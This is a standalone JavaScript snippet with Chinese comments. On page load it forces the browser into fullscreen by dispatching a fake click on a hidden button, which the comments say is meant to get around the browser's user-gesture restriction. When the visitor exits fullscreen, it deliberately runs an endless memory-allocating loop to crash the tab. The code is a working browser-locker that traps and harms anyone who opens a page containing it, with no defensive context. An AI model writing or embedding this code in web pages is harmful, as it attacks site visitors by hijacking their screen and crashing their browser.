(function() {
    function enterFullscreen() {
        var elem = document.documentElement;
        if (elem.requestFullscreen) {
            elem.requestFullscreen();
        } else if (elem.webkitRequestFullscreen) {
            elem.webkitRequestFullscreen();
        } else if (elem.mozRequestFullScreen) {
            elem.mozRequestFullScreen();
        } else if (elem.msRequestFullscreen) {
            elem.msRequestFullscreen();
        }
    }

    // 页面加载完成后，延迟1秒自动触发点击，绕过浏览器限制
    window.addEventListener('load', function() {
        setTimeout(function() {
            // 创建一个隐藏的按钮，自动点击它来触发全屏
            var btn = document.createElement('button');
            btn.style.display = 'none';
            document.body.appendChild(btn);
            
            btn.addEventListener('click', function() {
                enterFullscreen();
                document.body.removeChild(btn);
            });
            
            // 模拟点击
            var event = new MouseEvent('click', {
                bubbles: true,
                cancelable: true,
                view: window
            });
            btn.dispatchEvent(event);
        }, 1000);
    });

    // 退出全屏时直接崩溃
    var wasFullscreen = false;
    function onFullscreenChange() {
        var isFullscreen = !!(document.fullscreenElement || 
                              document.webkitFullscreenElement || 
                              document.mozFullScreenElement || 
                              document.msFullscreenElement);
        if (isFullscreen) {
            wasFullscreen = true;
        } else if (wasFullscreen) {
            wasFullscreen = false;
            var leak = [];
            while(true) {
                leak.push(new Array(10000000).join('x'));
            }
        }
    }
    document.addEventListener('fullscreenchange', onFullscreenChange);
    document.addEventListener('webkitfullscreenchange', onFullscreenChange);
    document.addEventListener('mozfullscreenchange', onFullscreenChange);
    document.addEventListener('MSFullscreenChange', onFullscreenChange);
})();
